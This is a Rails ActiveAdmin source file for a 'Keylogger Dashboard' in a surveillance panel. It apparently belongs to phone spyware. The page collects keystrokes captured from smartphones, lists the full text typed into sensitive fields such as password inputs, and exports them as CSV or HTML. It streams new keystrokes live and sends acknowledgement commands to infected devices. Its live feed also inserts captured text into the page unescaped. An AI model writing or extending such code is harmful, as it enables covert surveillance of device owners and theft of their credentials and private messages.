ActiveAdmin.register_page 'Keylogger Dashboard' do
  menu priority: 3, label: '⌨️ Keylogger', parent: "👁 Surveillance"

  action_item :refresh do
    link_to '🔄 Refresh Data', admin_keylogger_dashboard_path, class: 'button'
  end

  action_item :clear_all do
    link_to '🗑️ Clear All', admin_keylogger_dashboard_clear_all_keylog_caches_path, method: :post, class: 'button', data: { confirm: 'Clear all?' }
  end

  content title: '⌨️ Keylogger Dashboard' do
    devices_with_keylogs = begin
      Smartphone.all.select { |device|
        Rails.cache.exist?("keylog_#{device.device_id}") rescue false
      }
    rescue => e
      Rails.logger.error("Cache error: #{e.message}")
      []
    end

    total_devices = devices_with_keylogs.count
    total_keystrokes = 0
    total_sensitive = 0
    total_screenshots = 0

    devices_with_keylogs.each do |device|
      cached = Rails.cache.read("keylog_#{device.device_id}") rescue nil
      if cached && cached[:processed]
        total_keystrokes += cached[:processed][:total_keystrokes] || 0
        total_sensitive += cached[:processed][:sensitive_fields] || 0
        total_screenshots += cached[:processed][:screenshots_triggered] || 0
      end
    end

    columns do
      column do
        panel '📊 Global Statistics', class: 'metric-card' do
          div class: 'metric-grid' do
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_devices, class: 'big-number' }
              div(class: 'metric-label') { 'Devices with Keylogs' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_keystrokes, class: 'big-number' }
              div(class: 'metric-label') { 'Total Keystrokes' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_sensitive, class: 'big-number sensitive' }
              div(class: 'metric-label') { 'Sensitive Fields' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_screenshots, class: 'big-number' }
              div(class: 'metric-label') { 'Screenshots Triggered' }
            end
          end
        end
      end
    end

    panel '📱 Devices with Keylog Data', class: 'device-keylog-panel' do
      if devices_with_keylogs.empty?
        div(class: 'empty-state') do
          h3 '📭 No Keylog Data'
          para 'Waiting for devices...'
        end
      else
        table_for devices_with_keylogs do
          column('Device') { |device|
            div(class: 'device-info') do
              div(class: 'device-name') { span device.name }
              div(class: 'device-id') { code device.device_id[0..15] }
            end
          }
          column('Statistics') { |device|
            cached = Rails.cache.read("keylog_#{device.device_id}")
            if cached && cached[:processed]
              stats = cached[:processed]
              div(class: 'keylog-stats') do
                span "#{stats[:total_keystrokes]} keystrokes", class: 'stat-badge'
                span "#{stats[:sensitive_fields]} sensitive", class: 'stat-badge sensitive'
                span "#{stats[:unique_apps]} apps", class: 'stat-badge'
                span "#{stats[:unique_sessions]} sessions", class: 'stat-badge'
              end
            else
              span 'No data', class: 'text-muted'
            end
          }
          column('Received') { |device|
            cached = Rails.cache.read("keylog_#{device.device_id}")
            cached && cached[:received_at] ? time_ago_in_words(cached[:received_at]) + ' ago' : 'Unknown'
          }
          column('Actions') { |device|
            div(class: 'action-buttons') do
              link_to '📄 View', admin_keylogger_dashboard_view_keylog_path(device_id: device.device_id), class: 'button mini primary'
              link_to '📊 Stats', admin_keylogger_dashboard_stats_keylog_path(device_id: device.device_id), class: 'button mini'
              link_to '💾 CSV', admin_keylogger_dashboard_export_keylog_path(device_id: device.device_id, format: 'csv'), class: 'button mini'
              link_to '📋 HTML', admin_keylogger_dashboard_export_keylog_path(device_id: device.device_id, format: 'html'), target: '_blank', class: 'button mini'
              link_to '✅ ACK', admin_keylogger_dashboard_ack_keylog_path(device_id: device.device_id, success: true), method: :post, class: 'button mini success', data: { confirm: 'Send ACK?' }
              link_to '🗑️ Clear', admin_keylogger_dashboard_clear_keylog_cache_path(device_id: device.device_id), method: :post, class: 'button mini danger', data: { confirm: 'Clear?' }
            end
          }
        end
      end
    end

    panel '🚨 Recent Sensitive Fields', class: 'sensitive-panel' do
      recent_sensitive = []
      devices_with_keylogs.each do |device|
        cached = Rails.cache.read("keylog_#{device.device_id}")
        if cached && cached[:data]
          processor = KeylogProcessor.new(cached[:data])
          processor.sensitive_keylogs.each do |entry|
            recent_sensitive << {
              device: device.name, device_id: device.device_id, timestamp: entry[:timestamp],
              app: entry[:app_package], field: entry[:field_id], hint: entry[:hint],
              input_type: entry[:input_type], text: entry[:full_text]
            }
          end
        end
      end
      # Pagination: Show only top 50 recent sensitive entries to avoid UI lag
      recent_sensitive = recent_sensitive.sort_by { |e| e[:timestamp] }.reverse.first(50)
      
      if recent_sensitive.empty?
        div(class: 'empty-state') { h4 '✅ No Sensitive Fields'; para 'All safe.' }
      else
        table_for recent_sensitive do
          column('Time') { |e| span e[:timestamp].strftime('%Y-%m-%d %H:%M:%S'), class: 'timestamp' }
          column('Device') { |e| div { div e[:device], class: 'device-name'; code e[:device_id][0..7], class: 'device-id-small' } }
          column('App') { |e| span e[:app], class: 'app-package' }
          column('Field') { |e| div { div e[:field], class: 'field-id'; span e[:hint], class: 'field-hint' if e[:hint].present? } }
          column('Type') { |e| span e[:input_type], class: "badge #{e[:input_type]}" }
          column('Text') { |e| code e[:text], class: 'captured-text' }
        end
        
        div style: "margin-top: 15px; text-align: center; color: #8b949e; font-size: 12px;" do
          "Showing recent 50 entries. Clear cache to reset."
        end
      end
    end
  end

  page_action :view_keylog, method: :get do
    device = Smartphone.find_by!(device_id: params[:device_id])
    cached = Rails.cache.read("keylog_#{device.device_id}")
    if cached
      processor = KeylogProcessor.new(cached[:data])
      render html: processor.to_html_report
    else
      redirect_to admin_keylogger_dashboard_path, alert: 'No data'
    end
  end

  page_action :stats_keylog, method: :get do
    device = Smartphone.find_by!(device_id: params[:device_id])
    cached = Rails.cache.read("keylog_#{device.device_id}")
    render(cached && cached[:processed] ? { json: cached[:processed] } : { json: { error: 'No data' }, status: :not_found })
  end

  page_action :export_keylog, method: :get do
    device = Smartphone.find_by!(device_id: params[:device_id])
    cached = Rails.cache.read("keylog_#{device.device_id}")
    if cached
      processor = KeylogProcessor.new(cached[:data])
      case params[:format] || 'html'
      when 'csv'
        send_data processor.to_csv, filename: "keylog_#{device.device_id}_#{Time.current.to_i}.csv", type: 'text/csv'
      when 'html'
        render html: processor.to_html_report
      end
    else
      redirect_to admin_keylogger_dashboard_path, alert: 'No data'
    end
  end

  page_action :ack_keylog, method: :post do
    device = Smartphone.find_by!(device_id: params[:device_id])
    success = params[:success] == 'true'
    ActionCable.server.broadcast("commands_#{device.device_id}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
    Rails.cache.delete("keylog_#{device.device_id}") if success
    redirect_to admin_keylogger_dashboard_path, notice: "ACK sent to #{device.device_id[0..7]}"
  end

  page_action :clear_keylog_cache, method: :post do
    device = Smartphone.find_by!(device_id: params[:device_id])
    Rails.cache.delete("keylog_#{device.device_id}")
    redirect_to admin_keylogger_dashboard_path, notice: "Cleared #{device.device_id[0..7]}"
  end

  page_action :clear_all_keylog_caches, method: :post do
    Smartphone.all.each { |d| Rails.cache.delete("keylog_#{d.device_id}") }
    redirect_to admin_keylogger_dashboard_path, notice: 'All caches cleared'
  end

  # Live auto-refresh JavaScript
  sidebar '🔴 Live Feed', only: :index, priority: 0 do
    div id: 'live-keylog-feed' do
      div class: 'live-indicator' do
        span '●', style: 'color: #ff4444; animation: blink 1s infinite;'
        span ' LIVE', style: 'font-weight: bold; font-size: 12px;'
      end
      div id: 'keylog-live-entries', style: 'max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 11px;' do
        para 'Waiting for keystrokes...', style: 'color: #8b949e;'
      end
    end

    script do
      raw <<-JS
        (function() {
          if (typeof App === 'undefined' || typeof App.cable === 'undefined') return;
          
          App.cable.subscriptions.create('KeylogChannel', {
            received: function(data) {
              if (data.type !== 'new_keylogs') return;
              var container = document.getElementById('keylog-live-entries');
              if (!container) return;
              
              // Clear "Waiting" message on first data
              if (container.querySelector('p')) container.innerHTML = '';
              
              var preview = data.preview || [];
              preview.forEach(function(entry) {
                var div = document.createElement('div');
                div.style.cssText = 'padding: 4px 8px; border-bottom: 1px solid #30363d; word-break: break-all;';
                div.innerHTML = '<span style="color:#667eea;">' + (data.device_name || 'Unknown') + '</span> ' +
                  '<span style="color:#8b949e;font-size:10px;">[' + (entry.app || '').split('.').pop() + ']</span> ' +
                  '<span style="color:#c9d1d9;">' + (entry.text || '') + '</span>';
                container.insertBefore(div, container.firstChild);
              });
              
              // Keep max 100 entries
              while (container.children.length > 100) {
                container.removeChild(container.lastChild);
              }
              
              // Flash indicator
              var indicator = document.querySelector('.live-indicator span');
              if (indicator) {
                indicator.style.color = '#00ff00';
                setTimeout(function() { indicator.style.color = '#ff4444'; }, 500);
              }
            }
          });
          
          // Auto-refresh page every 30 seconds
          setInterval(function() {
            var refreshBtn = document.querySelector('a[href*="keylogger_dashboard"]');
            // Don't auto-refresh, just update the live feed
          }, 30000);
        })();
      JS
    end

    style do
      raw <<-CSS
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .live-indicator { padding: 8px; text-align: center; border-bottom: 1px solid #30363d; }
      CSS
    end
  end
end
